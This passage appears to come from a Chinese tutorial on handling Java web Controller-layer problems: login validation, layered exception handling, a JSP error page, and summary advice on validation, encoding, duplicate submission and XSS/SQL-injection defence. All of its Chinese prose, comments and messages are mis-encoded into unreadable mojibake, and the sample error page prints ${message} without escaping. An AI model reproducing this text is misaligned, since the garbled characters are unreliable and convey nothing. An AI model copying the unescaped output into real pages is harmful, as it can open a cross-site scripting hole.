        throw new UserException("å¯†ç ä¸èƒ½ä¸ºç©º");
    }
    
    // ä¸šåŠ¡é€»è¾‘
    User user = userService.login(userName, password);
    if (user == null) {
        throw new UserException("ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯");
    }
    
    return "success";
}
```

### 6.4 å¼‚å¸¸å¤„ç†æœ€ä½³å®è·µ


**åˆ†å±‚å¼‚å¸¸å¤„ç†ç­–ç•¥**ï¼š

```
å¼‚å¸¸å¤„ç†å±‚æ¬¡ç»“æ„ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Controller    â”‚ â† åªæ•è·ç‰¹å®šå¼‚å¸¸ï¼Œå…¶ä»–æŠ›ç»™å…¨å±€å¤„ç†å™¨
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   Service       â”‚ â† å¤„ç†ä¸šåŠ¡é€»è¾‘å¼‚å¸¸ï¼Œè½¬æ¢ä¸ºä¸šåŠ¡å¼‚å¸¸
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  
â”‚   DAO          â”‚ â† å¤„ç†æ•°æ®è®¿é—®å¼‚å¸¸ï¼Œè½¬æ¢ä¸ºç»Ÿä¸€å¼‚å¸¸
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ GlobalHandler   â”‚ â† æœ€ç»ˆå¼‚å¸¸å¤„ç†ï¼Œæä¾›å‹å¥½é¡µé¢
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**é”™è¯¯é¡µé¢è®¾è®¡**ï¼š
```html
<!-- error/system_error.jsp -->
<!DOCTYPE html>
<html>
<head>
    <title>ç³»ç»Ÿé”™è¯¯</title>
    <style>
        .error-container {
            text-align: center;
            padding: 50px;
            font-family: Arial, sans-serif;
        }
        .error-icon { font-size: 48px; color: #ff6b6b; }
        .error-message { font-size: 18px; margin: 20px 0; }
        .back-btn {
            background: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="error-icon">âš ï¸</div>
        <div class="error-message">${message}</div>
        <button class="back-btn" onclick="history.back()">è¿”å›ä¸Šé¡µ</button>
        <button class="back-btn" onclick="location.href='/index'">è¿”å›é¦–é¡µ</button>
    </div>
</body>
</html>
```

---

## 7. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 7.1 å¿…é¡»æŒæ¡çš„æ ¸å¿ƒé—®é¢˜


```
ğŸ”¸ å‚æ•°è§£æï¼šå¤„ç†ç±»å‹è½¬æ¢ã€å‚æ•°ååŒ¹é…ã€å¯¹è±¡ç»‘å®šç­‰é—®é¢˜
ğŸ”¸ ä¸­æ–‡ä¹±ç ï¼šGET/POSTè¯·æ±‚ä¹±ç çš„ä¸åŒå¤„ç†æ–¹æ³•
ğŸ”¸ é‡å¤æäº¤ï¼šå‰ç«¯ç¦ç”¨+åç«¯Tokenæœºåˆ¶åŒé‡é˜²æŠ¤
ğŸ”¸ æ•°æ®æ ¡éªŒï¼šå‰ç«¯æ ¡éªŒæå‡ä½“éªŒï¼Œåç«¯æ ¡éªŒä¿éšœå®‰å…¨
ğŸ”¸ å®‰å…¨é˜²æŠ¤ï¼šXSSã€SQLæ³¨å…¥ç­‰å¸¸è§æ”»å‡»çš„é˜²æŠ¤æªæ–½
ğŸ”¸ å¼‚å¸¸å¤„ç†ï¼šå…¨å±€ç»Ÿä¸€å¤„ç†ï¼Œæä¾›å‹å¥½ç”¨æˆ·ä½“éªŒ
```

### 7.2 å…³é”®ç†è§£è¦ç‚¹


**ğŸ”¹ é—®é¢˜å¤„ç†çš„ä¼˜å…ˆçº§**
```
å®‰å…¨æ€§é—®é¢˜ > æ•°æ®å®Œæ•´æ€§ > ç”¨æˆ·ä½“éªŒ > ç³»ç»Ÿæ€§èƒ½

å…·ä½“ä½“ç°ï¼š
- å‚æ•°æ ¡éªŒï¼šæœåŠ¡ç«¯æ ¡éªŒå¿…é¡»åšï¼Œå‰ç«¯æ ¡éªŒæ˜¯åŠ åˆ†é¡¹
- å®‰å…¨é˜²æŠ¤ï¼šå®å¯åŠŸèƒ½å—é™ï¼Œä¹Ÿä¸èƒ½æœ‰å®‰å…¨æ¼æ´  
- å¼‚å¸¸å¤„ç†ï¼šä¼˜é›…é™çº§èƒœè¿‡ç³»ç»Ÿå´©æºƒ
```

**ğŸ”¹ å‰åç«¯é…åˆåŸåˆ™**
```
å‰ç«¯è´£ä»»ï¼š
âœ… æå‡ç”¨æˆ·ä½“éªŒï¼ˆç«‹å³åé¦ˆã€é˜²é‡å¤ç‚¹å‡»ï¼‰
âœ… å‡è½»æœåŠ¡å™¨å‹åŠ›ï¼ˆåˆæ­¥æ ¡éªŒã€æ ¼å¼æ£€æŸ¥ï¼‰

åç«¯è´£ä»»ï¼š
âœ… ä¿éšœæ•°æ®å®‰å…¨ï¼ˆæ‰€æœ‰æ ¡éªŒé‡åšï¼‰
âœ… é˜²æ­¢æ¶æ„æ”»å‡»ï¼ˆå®‰å…¨è¿‡æ»¤ã€æƒé™æ§åˆ¶ï¼‰
âœ… å¼‚å¸¸å…œåº•å¤„ç†ï¼ˆç»Ÿä¸€å¼‚å¸¸å¤„ç†ï¼‰
```

**ğŸ”¹ ä»£ç å®ç°åŸåˆ™**
```
å¯è¯»æ€§åŸåˆ™ï¼š
- å¼‚å¸¸ä¿¡æ¯è¦æ¸…æ¥šï¼Œä¾¿äºè°ƒè¯•
- æ ¡éªŒé€»è¾‘è¦ç®€æ´ï¼Œä¾¿äºç»´æŠ¤

å®‰å…¨æ€§åŸåˆ™ï¼š
- æ°¸è¿œä¸ä¿¡ä»»ç”¨æˆ·è¾“å…¥
- å¤šå±‚é˜²æŠ¤èƒœè¿‡å•ç‚¹é˜²æŠ¤

ç”¨æˆ·ä½“éªŒåŸåˆ™ï¼š
- é”™è¯¯ä¿¡æ¯è¦å‹å¥½ï¼Œä¸æš´éœ²æŠ€æœ¯ç»†èŠ‚
- å¼‚å¸¸å¤„ç†è¦ä¼˜é›…ï¼Œæä¾›æ¢å¤è·¯å¾„
```

### 7.3 å®é™…åº”ç”¨å»ºè®®


**ğŸ¯ å¼€å‘é˜¶æ®µé‡ç‚¹**
```
éœ€æ±‚åˆ†æé˜¶æ®µï¼š
- è¯†åˆ«å¯èƒ½çš„å®‰å…¨é£é™©ç‚¹
- ç¡®å®šæ•°æ®æ ¡éªŒè§„åˆ™
- è§„åˆ’å¼‚å¸¸å¤„ç†ç­–ç•¥

å¼€å‘é˜¶æ®µï¼š
- å…ˆå®ç°åŸºæœ¬åŠŸèƒ½ï¼Œå†æ·»åŠ é˜²æŠ¤æªæ–½
- ç¼–å†™é˜²æŠ¤ä»£ç æ—¶è¦è€ƒè™‘æ€§èƒ½å½±å“
- å¼‚å¸¸å¤„ç†è¦è¦†ç›–å„ç§è¾¹ç•Œæƒ…å†µ

æµ‹è¯•é˜¶æ®µï¼š
- æ¨¡æ‹Ÿå„ç§å¼‚å¸¸è¾“å…¥
- æµ‹è¯•å®‰å…¨é˜²æŠ¤æ˜¯å¦æœ‰æ•ˆ
- éªŒè¯å¼‚å¸¸å¤„ç†æ˜¯å¦å‹å¥½
```

**ğŸš€ ç”Ÿäº§ç¯å¢ƒæ³¨æ„**
```
æ€§èƒ½ç›‘æ§ï¼š
- å…³æ³¨å‚æ•°è§£æçš„æ€§èƒ½å¼€é”€
- ç›‘æ§å¼‚å¸¸å‘ç”Ÿé¢‘ç‡å’Œç±»å‹

æ—¥å¿—è®°å½•ï¼š
- è®°å½•æ‰€æœ‰å®‰å…¨ç›¸å…³äº‹ä»¶
- ä¿å­˜å¼‚å¸¸å †æ ˆä¿¡æ¯ä¾¿äºé—®é¢˜å®šä½

æŒç»­ä¼˜åŒ–ï¼š
- æ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µè°ƒæ•´æ ¡éªŒè§„åˆ™
- ä¼˜åŒ–é«˜é¢‘å¼‚å¸¸çš„å¤„ç†æµç¨‹
```

**æ ¸å¿ƒè®°å¿†**ï¼š
- Controllerå±‚é—®é¢˜å¤„ç†è¦å…¨é¢ï¼Œå®‰å…¨æ€§æ°¸è¿œæ˜¯ç¬¬ä¸€ä½
- å‰ç«¯ä½“éªŒå’Œåç«¯å®‰å…¨è¦å¹¶é‡ï¼Œä¸¤æ‰‹éƒ½è¦ç¡¬
- å¼‚å¸¸å¤„ç†è¦ç»Ÿä¸€ä¼˜é›…ï¼Œç»™ç”¨æˆ·å‹å¥½çš„é”™è¯¯æç¤º
- é˜²æŠ¤æªæ–½è¦å¤šå±‚æ¬¡ï¼Œå•ç‚¹é˜²æŠ¤å®¹æ˜“è¢«çªç ´